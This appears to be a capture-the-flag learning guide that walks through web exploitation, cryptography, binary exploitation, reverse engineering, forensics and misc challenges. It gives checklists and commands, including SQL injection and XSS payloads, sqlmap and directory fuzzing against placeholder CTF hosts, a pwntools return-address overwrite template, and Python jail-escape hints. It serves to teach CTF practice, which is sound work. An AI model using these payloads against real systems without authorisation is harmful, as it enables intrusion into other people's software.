Deep dives into each discipline — with real commands, payloads, and checklists.

Web Exploitation

Beginner Friendly ● ● ○ ○

About This Category

Web challenges involve finding and exploiting vulnerabilities in websites and web applications. This is one of the most approachable categories because you interact with familiar technology — browsers, forms, and HTTP requests.

Common vulnerability types include SQL injection, Cross-Site Scripting (XSS), insecure cookies, directory traversal, Server-Side Template Injection (SSTI), and broken authentication.

What You'll Learn

  • How HTTP requests and responses work
  • SQL injection and input sanitization flaws
  • XSS and cookie stealing techniques
  • Directory and file enumeration
  • Source code inspection and hidden comments

Beginner Checklist

  • View page source (Ctrl+U) and check for comments or hidden fields
  • Check /robots.txt and /sitemap.xml for hidden paths
  • Test login forms for SQL injection (' OR '1'='1)
  • Test input fields for reflected XSS (<script>alert(1)</script>)
  • Use Burp Suite to intercept and modify requests
  • Fuzz directories with dirb or gobuster
  • Inspect cookies and JWT tokens for weak secrets
bash / sql 
# Basic recon
curl -I https://target.ctf/
curl https://target.ctf/robots.txt

# Directory fuzzing
gobuster dir -u http://target.ctf/ -w /usr/share/wordlists/dirb/common.txt

# SQL injection test payloads
' OR '1'='1'--
' OR 1=1--
admin'--
' UNION SELECT null,null,null--

# Read cookies
curl -c cookies.txt -b cookies.txt http://target.ctf/login

# SQLMap automated injection
sqlmap -u "http://target.ctf/login" --forms --batch --level=3

Cryptography

Intermediate ● ● ● ○

About This Category

Crypto challenges require breaking codes, deciphering encrypted messages, or exploiting mathematical weaknesses in cryptographic implementations. Understanding both classical and modern cryptography is essential.

Common challenge types: base64/hex encoding, ROT13/Caesar ciphers, XOR encryption, weak RSA parameters, hash cracking, AES misuse, and custom cipher implementations.

What You'll Learn

  • Classical ciphers: Caesar, Vigenère, XOR
  • Encoding schemes: Base64, hex, binary, URL encoding
  • RSA fundamentals and common weaknesses
  • Hash functions and cracking techniques
  • Using Python for custom crypto attacks

Beginner Checklist

  • Identify the encoding type before attempting to crack
  • Try CyberChef "Magic" wand — it autodetects common encodings
  • Test for XOR with single byte and known-plaintext attacks
  • Crack MD5/SHA1 hashes with hashcat or online rainbow tables
  • Look for RSA parameters (n, e, p, q) and check if n is factorable
  • Use factordb.com to factor small RSA moduli
bash / python 
# Base64 decode
echo "Q1RGe2Jhc2U2NH0=" | base64 -d

# Hex decode
echo "4354467b68657821" | xxd -r -p

# ROT13
echo "PGS{ebg13}" | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# XOR single byte brute-force (Python)
cipher = bytes.fromhex("1b3c2f...")
for k in range(256):
    plain = bytes([b ^ k for b in cipher])
    if b"CTF{" in plain:
        print(k, plain)

# Crack a hash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

Pwn / Binary Exploitation

Advanced ● ● ● ●

About This Category

Pwn challenges involve exploiting memory corruption vulnerabilities in compiled programs. You interact with a running process — either locally or via a TCP connection — and manipulate its memory to gain control.

Common techniques: buffer overflows, return-oriented programming (ROP), format string exploits, heap exploitation, and shellcode injection.

What You'll Learn

  • How memory layout and the stack work in x86/x86_64
  • Buffer overflow and return address overwriting
  • Finding and controlling the instruction pointer
  • Building ROP chains to bypass NX/DEP
  • Using pwntools to write clean exploit scripts

Beginner Checklist

  • Run checksec to identify binary protections (NX, PIE, RELRO, canary)
  • Run the binary and test for crash with a long input
  • Use cyclic (pwntools) to find the exact overflow offset
  • Search for a win() or shell() function with nm or Ghidra
  • Overwrite return address with the win function address
  • Build a ROP chain when NX is enabled
python / bash 
# Check binary protections
checksec --file=./vuln

# Find crash offset
python3 -c "print('A'*200)" | ./vuln
cyclic 200 | ./vuln

# Basic pwntools template
from pwn import *

elf = ELF('./vuln')
p = process('./vuln')
# p = remote('target.ctf', 1337)

offset = 64
win_addr = elf.symbols['win']
payload = b'A' * offset + p64(win_addr)

p.sendlineafter(b'> ', payload)
p.interactive()

Reverse Engineering

Intermediate ● ● ● ○

About This Category

RE challenges give you a compiled binary and ask you to figure out what it does, find a hidden password, or understand a custom algorithm — all without the original source code.

You'll work with disassemblers, decompilers, and dynamic analysis tools to reconstruct the program's logic and extract the flag.

What You'll Learn

  • Reading x86/x86_64 assembly code
  • Using Ghidra or IDA Free to decompile binaries
  • Dynamic analysis with GDB and ltrace/strace
  • Identifying string comparison and flag check logic
  • Patching binaries to bypass checks

Beginner Checklist

  • Run file to identify binary type and architecture
  • Run strings — flags are sometimes stored in plaintext
  • Use ltrace/strace to trace library/system calls at runtime
  • Open in Ghidra and decompile the main function
  • Find the flag comparison — look for strcmp, strncmp, or custom loops
  • Patch the binary or reverse the algorithm to extract the flag
bash 
# Identify file type
file ./challenge

# Search for readable strings
strings ./challenge | grep -i "ctf\|flag\|key\|pass"

# Trace library calls at runtime
ltrace ./challenge
strace ./challenge

# List exported/imported symbols
nm ./challenge | grep -i "win\|flag\|check"
objdump -d ./challenge | less

# Ghidra headless analysis
analyzeHeadless /tmp/ghidra_project proj \
  -import ./challenge -postScript PrintStringDump.java

Forensics / OSINT

Beginner Friendly ● ● ○ ○

About This Category

Forensics challenges hide data inside files, network packet captures, disk images, memory dumps, or images. Your job is to investigate the artifact and extract the hidden flag.

OSINT (Open Source Intelligence) challenges ask you to find information about a person, place, or organization using only publicly available sources.

What You'll Learn

  • File format identification and metadata analysis
  • Steganography: data hidden inside images/audio
  • Network packet analysis with Wireshark
  • Extracting embedded files with binwalk
  • Memory forensics with Volatility

Beginner Checklist

  • Run file to confirm the actual file type (extensions lie)
  • Run strings — look for the flag pattern in the raw output
  • Run binwalk to extract any embedded files
  • Check metadata with exiftool — flags hide in EXIF comments
  • Open .pcap files in Wireshark and follow TCP/HTTP streams
  • For images, try steghide and zsteg for steganography
bash 
# Identify file and check magic bytes
file suspicious.png
xxd suspicious.png | head -5

# Search for flag in raw bytes
strings suspicious.png | grep -i "ctf\|flag"

# Extract embedded files
binwalk -e suspicious.png

# Check image/file metadata
exiftool suspicious.png

# Network capture analysis
wireshark capture.pcap &
tshark -r capture.pcap -qz "follow,tcp,ascii,0"

# Steganography extraction
steghide extract -sf image.jpg
zsteg image.png

Misc

Beginner Friendly ● ○ ○ ○

About This Category

Misc challenges are wildly varied — scripting puzzles, trivia, programming problems, jail escapes, QR codes, audio challenges, and creative lateral-thinking problems that don't fit neatly into other categories.

These often require creativity and a broad skillset more than deep expertise. They are great entry points for beginners because the solutions are highly varied.

What You'll Learn

  • Python scripting for automation and data manipulation
  • Bash/shell one-liners for quick processing
  • Recognizing obscure encodings and formats
  • Escaping sandboxed Python/bash environments
  • Creative problem solving under time pressure

Beginner Checklist

  • Read the challenge description extremely carefully — the hint is in the text
  • Google every unusual term, filename, or reference in the challenge
  • Try Python scripting to automate repetitive processing
  • Check if input/output is provided — write a script to generate all permutations
  • Look for hidden input channels: URL parameters, HTTP headers, environment variables
  • For jail escapes, try __import__, os.system, and class hierarchy traversal
python 
#!/usr/bin/env python3
# Generic CTF scripting skeleton

import socket
import re

HOST = 'target.ctf'
PORT = 1337

def solve():
    with socket.create_connection((HOST, PORT)) as s:
        # Read challenge prompt
        data = s.recv(4096).decode()
        print(data)

        # Parse and respond
        # answer = compute_answer(data)
        # s.sendall(f"{answer}\n".encode())

        # Read response and extract flag
        response = s.recv(4096).decode()
        flag = re.search(r'CTF\{[^}]+\}', response)
        if flag:
            print("FLAG:", flag.group())

if __name__ == '__main__':
    solve()
